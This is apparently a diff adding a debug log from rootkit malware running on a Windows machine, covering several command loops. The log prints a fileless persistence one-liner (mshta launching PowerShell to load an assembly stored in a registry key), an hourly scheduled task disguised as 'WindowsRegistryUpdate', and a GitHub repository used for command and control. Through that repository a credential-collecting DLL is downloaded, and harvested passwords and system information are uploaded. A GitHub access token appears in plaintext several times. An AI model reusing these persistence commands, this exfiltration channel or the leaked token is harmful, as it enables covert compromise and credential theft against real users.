@@ -1,0 +1,387 @@
+Thu Sep  2 22:24:24 2021. Initialisation of the log file.
+
+DEBUG: Thu Sep  2 22:24:24 2021: GithubLogin: hidemepls785
+DEBUG: Thu Sep  2 22:24:24 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Thu Sep  2 22:24:24 2021: GihubAccessToken: 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
+DEBUG: Thu Sep  2 22:24:24 2021: Rootkit Name: CorepPreprod3
+DEBUG: Thu Sep  2 22:24:24 2021: Rootkit Registry Key: Sensors
+DEBUG: Thu Sep  2 22:24:24 2021: Run Registry Key Name: test
+DEBUG: Thu Sep  2 22:24:24 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Thu Sep  2 22:24:24 2021: The folder list for random folder is not empty. Its size is: 2856
+DEBUG: Thu Sep  2 22:24:24 2021: The random path choosed for this execution is: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience
+DEBUG: Thu Sep  2 22:24:24 2021: Start of the method createSchTaskCommandLine. 
+DEBUG: Thu Sep  2 22:24:24 2021: This content will be written in the start up batch: @echo off
+mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Sensors\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
+exit
+DEBUG: Thu Sep  2 22:24:25 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:25 2021: The content size that will be written: 264
+ERROR: Thu Sep  2 22:24:25 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Sep  2 22:24:25 2021: This command will be played: schtasks /create /TR "'cmd /MIN /c C:\Users\gilles\AppData\Roaming\RegistryBackup.bat'" /TN WindowsRegistryUpdate /SC hourly
+DEBUG: Thu Sep  2 22:24:25 2021: End of the createSchTaskCommandLine method.
+DEBUG: Thu Sep  2 22:24:25 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 22:24:25 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Sep  2 22:24:25 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Sep  2 22:24:25 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Sep  2 22:24:25 2021: Getting this command from the github repo: schtasks //query //TN "WindowsRegistryUpdate"
+DEBUG: Thu Sep  2 22:24:25 2021: Getting this command from the github repo: password
+DEBUG: Thu Sep  2 22:24:25 2021: Getting this command from the github repo: execute_cmd systeminfo
+DEBUG: Thu Sep  2 22:24:25 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Sep  2 22:24:25 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:25 2021: Command received: schtasks
+DEBUG: Thu Sep  2 22:24:25 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:25 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:25 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:25 2021: Command received: password
+DEBUG: Thu Sep  2 22:24:25 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:25 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:27 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Sep  2 22:24:27 2021: The size of the content of the file is: 343040
+DEBUG: Thu Sep  2 22:24:27 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:27 2021: The content size that will be written: 343040
+DEBUG: Thu Sep  2 22:24:27 2021: Success to write the content(number of bytes : 343040) in the file : C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:27 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:27 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Sep  2 22:24:27 2021: End of the execution of the password dll.
+DEBUG: Thu Sep  2 22:24:27 2021: The file that contains passwords has been created.
+DEBUG: Thu Sep  2 22:24:27 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:27 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt
+DEBUG: Thu Sep  2 22:24:27 2021: The file that will be read weight: 2378
+DEBUG: Thu Sep  2 22:24:27 2021: Success to read the binary file. This number of bytes have been read: 2379
+DEBUG: Thu Sep  2 22:24:28 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt has been uploaded successfully in the github repo
+DEBUG: Thu Sep  2 22:24:28 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: password_output.txt
+DEBUG: Thu Sep  2 22:24:28 2021: The file truely exists in the random folder.
+DEBUG: Thu Sep  2 22:24:28 2021: Success to delete the file. End of the method
+DEBUG: Thu Sep  2 22:24:28 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: chromepassword
+DEBUG: Thu Sep  2 22:24:28 2021: The file does not exist in the random folder. Aborting.
+DEBUG: Thu Sep  2 22:24:28 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:28 2021: The file truely exists in the random folder.
+ERROR: Thu Sep  2 22:24:28 2021: Fail to delete the file. Here is the last windows error: 5
+DEBUG: Thu Sep  2 22:24:28 2021: End of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:28 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:28 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:28 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:28 2021: Command received: execute_cmd
+DEBUG: Thu Sep  2 22:24:28 2021: The following command will be executed by powershell: systeminfo > C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:30 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:30 2021: The file that will be read weight: 4566
+DEBUG: Thu Sep  2 22:24:30 2021: Success to read the binary file. This number of bytes have been read: 4567
+DEBUG: Thu Sep  2 22:24:30 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Thu Sep  2 22:24:30 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:30 2021: The content size that will be written: 4567
+DEBUG: Thu Sep  2 22:24:30 2021: Success to write the content(number of bytes : 4567) in the file : C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:30 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Sep  2 22:24:30 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:30 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:30 2021: The file that will be read weight: 4567
+DEBUG: Thu Sep  2 22:24:30 2021: Success to read the binary file. This number of bytes have been read: 4568
+DEBUG: Thu Sep  2 22:24:30 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log has been uploaded successfully in the github repo
+DEBUG: Thu Sep  2 22:24:30 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:30 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:30 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Sep  2 22:24:31 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Sep  2 22:24:31 2021: Unable to have send sucess, trying another loop.
+DEBUG: Thu Sep  2 22:24:31 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 22:24:31 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Sep  2 22:24:31 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Sep  2 22:24:31 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Sep  2 22:24:31 2021: Getting this command from the github repo: schtasks //query //TN "WindowsRegistryUpdate"
+DEBUG: Thu Sep  2 22:24:31 2021: Getting this command from the github repo: password
+DEBUG: Thu Sep  2 22:24:31 2021: Getting this command from the github repo: execute_cmd systeminfo
+DEBUG: Thu Sep  2 22:24:31 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Sep  2 22:24:31 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:31 2021: Command received: schtasks
+DEBUG: Thu Sep  2 22:24:31 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:31 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:31 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:31 2021: Command received: password
+DEBUG: Thu Sep  2 22:24:31 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:31 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:32 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Sep  2 22:24:32 2021: The size of the content of the file is: 343040
+DEBUG: Thu Sep  2 22:24:32 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:32 2021: The content size that will be written: 343040
+ERROR: Thu Sep  2 22:24:32 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Sep  2 22:24:32 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:32 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Sep  2 22:24:32 2021: End of the execution of the password dll.
+DEBUG: Thu Sep  2 22:24:32 2021: The file that contains passwords has been created.
+DEBUG: Thu Sep  2 22:24:32 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:32 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt
+DEBUG: Thu Sep  2 22:24:32 2021: The file that will be read weight: 2378
+DEBUG: Thu Sep  2 22:24:32 2021: Success to read the binary file. This number of bytes have been read: 2379
+DEBUG: Thu Sep  2 22:24:33 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt has not been uploaded in the github repo with the name: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt. Here is the answer of the api : {
+  "message": "C:\\Users\\gilles\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\MobilityExperience\\password_output.txt does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 22:24:33 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt credentials: hidemepls785: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
+DEBUG: Thu Sep  2 22:24:33 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: password_output.txt
+DEBUG: Thu Sep  2 22:24:33 2021: The file truely exists in the random folder.
+DEBUG: Thu Sep  2 22:24:33 2021: Success to delete the file. End of the method
+DEBUG: Thu Sep  2 22:24:33 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: chromepassword
+DEBUG: Thu Sep  2 22:24:33 2021: The file does not exist in the random folder. Aborting.
+DEBUG: Thu Sep  2 22:24:33 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:33 2021: The file truely exists in the random folder.
+ERROR: Thu Sep  2 22:24:33 2021: Fail to delete the file. Here is the last windows error: 5
+DEBUG: Thu Sep  2 22:24:33 2021: End of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:33 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:33 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:33 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:33 2021: Command received: execute_cmd
+DEBUG: Thu Sep  2 22:24:33 2021: The following command will be executed by powershell: systeminfo > C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:33 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:33 2021: The file that will be read weight: 4567
+DEBUG: Thu Sep  2 22:24:33 2021: Success to read the binary file. This number of bytes have been read: 4568
+DEBUG: Thu Sep  2 22:24:33 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Thu Sep  2 22:24:33 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:33 2021: The content size that will be written: 4568
+DEBUG: Thu Sep  2 22:24:33 2021: Success to write the content(number of bytes : 4568) in the file : C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:33 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Sep  2 22:24:33 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:33 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:33 2021: The file that will be read weight: 4568
+DEBUG: Thu Sep  2 22:24:33 2021: Success to read the binary file. This number of bytes have been read: 4569
+DEBUG: Thu Sep  2 22:24:33 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log has not been uploaded in the github repo with the name: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log. Here is the answer of the api : {
+  "message": "C:\\Users\\gilles\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\MobilityExperience\\target_command1.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 22:24:33 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log credentials: hidemepls785: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
+DEBUG: Thu Sep  2 22:24:33 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:33 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:33 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Sep  2 22:24:33 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Sep  2 22:24:34 2021: Unable to have send sucess, trying another loop.
+DEBUG: Thu Sep  2 22:24:34 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 22:24:34 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Sep  2 22:24:34 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Sep  2 22:24:34 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Sep  2 22:24:34 2021: Getting this command from the github repo: schtasks //query //TN "WindowsRegistryUpdate"
+DEBUG: Thu Sep  2 22:24:34 2021: Getting this command from the github repo: password
+DEBUG: Thu Sep  2 22:24:34 2021: Getting this command from the github repo: execute_cmd systeminfo
+DEBUG: Thu Sep  2 22:24:34 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Sep  2 22:24:34 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:34 2021: Command received: schtasks
+DEBUG: Thu Sep  2 22:24:34 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:34 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:34 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:34 2021: Command received: password
+DEBUG: Thu Sep  2 22:24:34 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:34 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:35 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Sep  2 22:24:35 2021: The size of the content of the file is: 343040
+DEBUG: Thu Sep  2 22:24:35 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:35 2021: The content size that will be written: 343040
+ERROR: Thu Sep  2 22:24:35 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Sep  2 22:24:35 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:35 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Sep  2 22:24:35 2021: End of the execution of the password dll.
+DEBUG: Thu Sep  2 22:24:35 2021: The file that contains passwords has been created.
+DEBUG: Thu Sep  2 22:24:35 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:35 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt
+DEBUG: Thu Sep  2 22:24:35 2021: The file that will be read weight: 2378
+DEBUG: Thu Sep  2 22:24:35 2021: Success to read the binary file. This number of bytes have been read: 2379
+DEBUG: Thu Sep  2 22:24:35 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt has not been uploaded in the github repo with the name: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt. Here is the answer of the api : {
+  "message": "C:\\Users\\gilles\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\MobilityExperience\\password_output.txt does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 22:24:35 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt credentials: hidemepls785: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
+DEBUG: Thu Sep  2 22:24:35 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: password_output.txt
+DEBUG: Thu Sep  2 22:24:35 2021: The file truely exists in the random folder.
+DEBUG: Thu Sep  2 22:24:35 2021: Success to delete the file. End of the method
+DEBUG: Thu Sep  2 22:24:35 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: chromepassword
+DEBUG: Thu Sep  2 22:24:35 2021: The file does not exist in the random folder. Aborting.
+DEBUG: Thu Sep  2 22:24:35 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:35 2021: The file truely exists in the random folder.
+ERROR: Thu Sep  2 22:24:35 2021: Fail to delete the file. Here is the last windows error: 5
+DEBUG: Thu Sep  2 22:24:35 2021: End of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:35 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:35 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:35 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:35 2021: Command received: execute_cmd
+DEBUG: Thu Sep  2 22:24:35 2021: The following command will be executed by powershell: systeminfo > C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:35 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:35 2021: The file that will be read weight: 4566
+DEBUG: Thu Sep  2 22:24:35 2021: Success to read the binary file. This number of bytes have been read: 4567
+DEBUG: Thu Sep  2 22:24:35 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Thu Sep  2 22:24:35 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:35 2021: The content size that will be written: 4567
+DEBUG: Thu Sep  2 22:24:35 2021: Success to write the content(number of bytes : 4567) in the file : C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:36 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Thu Sep  2 22:24:36 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:36 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log
+DEBUG: Thu Sep  2 22:24:36 2021: The file that will be read weight: 4567
+DEBUG: Thu Sep  2 22:24:36 2021: Success to read the binary file. This number of bytes have been read: 4568
+DEBUG: Thu Sep  2 22:24:36 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log has not been uploaded in the github repo with the name: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log. Here is the answer of the api : {
+  "message": "C:\\Users\\gilles\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\MobilityExperience\\target_command1.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 22:24:36 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\target_command1.log credentials: hidemepls785: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
+DEBUG: Thu Sep  2 22:24:36 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:36 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:36 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Sep  2 22:24:36 2021: The place of the rootkit has not been found on the json
+DEBUG: Thu Sep  2 22:24:36 2021: Unable to have send sucess, trying another loop.
+DEBUG: Thu Sep  2 22:24:36 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 22:24:36 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Sep  2 22:24:37 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Sep  2 22:24:37 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Sep  2 22:24:37 2021: Getting this command from the github repo: schtasks //query //TN "WindowsRegistryUpdate"
+DEBUG: Thu Sep  2 22:24:37 2021: Getting this command from the github repo: password
+DEBUG: Thu Sep  2 22:24:37 2021: Getting this command from the github repo: execute_cmd systeminfo
+DEBUG: Thu Sep  2 22:24:37 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Sep  2 22:24:37 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:37 2021: Command received: schtasks
+DEBUG: Thu Sep  2 22:24:37 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:37 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:37 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Thu Sep  2 22:24:37 2021: Command received: password
+DEBUG: Thu Sep  2 22:24:37 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:37 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:37 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Sep  2 22:24:37 2021: The size of the content of the file is: 343040
+DEBUG: Thu Sep  2 22:24:37 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 22:24:37 2021: The content size that will be written: 343040
+ERROR: Thu Sep  2 22:24:38 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Sep  2 22:24:38 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:38 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Sep  2 22:24:38 2021: End of the execution of the password dll.
+DEBUG: Thu Sep  2 22:24:38 2021: The file that contains passwords has been created.
+DEBUG: Thu Sep  2 22:24:38 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 22:24:38 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt
+DEBUG: Thu Sep  2 22:24:38 2021: The file that will be read weight: 2378
+DEBUG: Thu Sep  2 22:24:38 2021: Success to read the binary file. This number of bytes have been read: 2379
+DEBUG: Thu Sep  2 22:24:38 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt has not been uploaded in the github repo with the name: C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt. Here is the answer of the api : {
+  "message": "C:\\Users\\gilles\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\MobilityExperience\\password_output.txt does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 22:24:38 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\gilles\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\MobilityExperience\password_output.txt credentials: hidemepls785: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
+DEBUG: Thu Sep  2 22:24:38 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: password_output.txt
+DEBUG: Thu Sep  2 22:24:38 2021: The file truely exists in the random folder.
+DEBUG: Thu Sep  2 22:24:38 2021: Success to delete the file. End of the method
+DEBUG: Thu Sep  2 22:24:38 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: chromepassword
+DEBUG: Thu Sep  2 22:24:38 2021: The file does not exist in the random folder. Aborting.
+DEBUG: Thu Sep  2 22:24:38 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: CredentialsCollectorDll.dll
+DEBUG: Thu Sep  2 22:24:38 2021: The file truely exists in the random folder.
+ERROR: Thu Sep  2 22:24:38 2021: Fail to delete the file. Here is the last windows error: 5
+DEBUG: Thu Sep  2 22:24:38 2021: End of the method messageManagerPasswordModule.
+DEBUG: Thu Sep  2 22:24:38 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Sep  2 22:24:38 2021: #####################################################
+
+DEBUG: Thu Sep  2 22:24:38 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
